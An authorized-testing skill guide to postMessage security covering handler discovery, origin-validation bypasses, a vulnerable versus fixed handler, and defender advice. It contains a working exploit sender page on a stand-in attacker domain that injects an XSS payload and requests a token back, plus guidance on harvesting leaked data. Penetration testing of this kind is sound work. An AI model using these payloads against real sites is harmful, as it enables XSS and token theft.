---
name: postmessage-security
description: Use when assessing postMessage communication between
  windows and iframes on an authorized engagement. Covers origin
  validation flaws, message handler review, and cross origin data
  leaks. Also use when reviewing embedded widgets, payment iframes, or
  OAuth popup flows.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [web-xss, cors-misconfig, dom-clobbering]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

postMessage lets windows talk across origins, and handlers that skip
origin checks let any site talk to your page: steal tokens, trigger
actions, or leak data. This skill covers authorized assessment:
finding message handlers, testing origin validation, and proving
impact with a malicious sender page you host in the test environment.

## Quick Workflow

1. Find every message listener: search JS for addEventListener with
   'message'.
2. Read each handler: does it check event.origin, and against what.
3. Map what the handler does with event.data: DOM writes, token use,
   navigation, eval.
4. Build a sender page on your test domain that posts crafted
   messages to the target.
5. Prove the impact: data exfiltration, action invocation, or XSS.
6. Check the reverse direction: what the target posts outward and to
   which origins.
7. Review origin allowlists for bypasses (subdomain, suffix match).
8. Document the handler code, the missing check, and the working
   exploit page.

## 1. Handler discovery and review

```bash
# Find listeners in the app's JavaScript
grep -rn "addEventListener(['\"]message" /tmp/app.js | head -20
# For each, read the handler and answer:
# 1. is event.origin checked? 2. against an exact string or a regex?
# 3. is event.source verified? 4. is event.data validated before use?
```

```javascript
// VULNERABLE: no origin check
window.addEventListener('message', (e) => {
  document.getElementById('out').innerHTML = e.data.html; // XSS from any origin
});

// FIXED: strict origin check plus data validation
const TRUSTED = 'https://widget.example';
window.addEventListener('message', (e) => {
  if (e.origin !== TRUSTED) return;
  if (typeof e.data.html !== 'string') return;
  document.getElementById('out').textContent = e.data.html;
});
```

## 2. Exploit sender page (test environment)

```html
<!-- Host on https://evil-test.example (your test domain) -->
<iframe src="https://target.example/widget" id="t"></iframe>
<script>
// Wait for load, then post the malicious message
window.onload = () => {
  const t = document.getElementById('t').contentWindow;
  // No origin check on the target? use '*' or the target origin
  t.postMessage({html: '<img src=x onerror=alert(document.domain)>'}, '*');
  // For data theft handlers: ask it to send data back and listen
  window.addEventListener('message', (e) => {
    console.log('leaked back:', e.data);
  });
  t.postMessage({action: 'getToken'}, '*');
};
</script>
```

```bash
# Origin validation bypass patterns to test where a check exists:
# - e.origin check against 'https://app.example' bypassed by
#   'https://app.example.evil.com' if the check is a substring match
# - null origin (sandboxed iframe) accepted by sloppy checks
# - postMessage to '*' on the sending side leaks data to any embedder
grep -rn "postMessage(.*'\*'" /tmp/app.js | head -10
```

## Edge cases

- The handler checks origin but the allowlist is data driven. Find
  where the allowlist comes from; a user controlled list is no
  allowlist.
- Messages are validated with a schema but origin is not checked.
  Schema validation does not replace origin checks; test both.
- The flow needs user interaction (click). Your sender page can
  include the clickjacking step; note the interaction requirement.

## Escalation

- Handler is safe but the sender uses '*': the leak goes the other
  way; embed the target and harvest what it broadcasts.
- Multiple handlers: test each; one weak handler is enough.
- postMessage is fine: check related vectors (CORS, window.name)
  before closing the area.

## Detection and defender view

Defenders see postMessage attacks as unexpected cross origin
iframes and messages, detectable in client telemetry when
instrumented. The durable fix is boring and effective: check
event.origin against an exact allowlist in every handler, validate
event.data shape, and never postMessage sensitive data to '*'.
Code review checklists should flag every new message listener.

## Key references

- CWE-942 (Overly Permissive Cross-domain Whitelist).
- CWE-79 (Cross-site Scripting): the common escalation.
- HTML Living Standard: postMessage security considerations.
